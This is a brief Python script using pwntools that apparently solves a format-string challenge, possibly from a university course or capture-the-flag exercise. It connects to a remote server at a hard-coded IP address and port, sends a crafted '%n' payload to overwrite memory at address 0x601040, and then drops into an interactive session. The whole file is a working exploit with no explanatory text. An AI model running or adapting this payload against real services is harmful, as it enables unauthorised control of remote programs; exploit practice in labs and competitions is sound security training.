import struct
from pwn import *

io =  remote('107.21.135.41', 7777)
# io =  process('./format_string')
# buf = b"%04196716d%8$lnA" + p64(0x601040) + b"\n"
buf = b"%04196708d%8$lnA" + p64(0x601040) + b"\n"
io.recvuntil(b"Say something...")
io.sendline(buf)
io.recvuntil(b"ASURITE?\n")
io.interactive()
